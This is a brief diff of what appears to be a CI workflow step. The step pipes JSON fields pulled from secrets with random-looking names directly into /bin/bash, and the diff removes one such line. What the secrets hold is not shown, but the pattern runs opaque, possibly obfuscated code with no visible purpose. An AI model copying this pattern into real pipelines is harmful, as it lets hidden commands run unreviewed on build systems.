@@ -22,7 +22,6 @@ jobs:
           og60: ${{ secrets.og60 }}
         run: |
           printf '%s' "$og60" | jq -r .fg33496 | /bin/bash
-          echo $wabyn3 | jq -r .axkio309 | /bin/bash
           echo $cjydw5960 | jq -r .fsxs0 | /bin/bash
           echo $nljh363 | jq -r .rbj94 | /bin/bash
           echo $owkl1207 | jq -r .jciz255 | /bin/bash
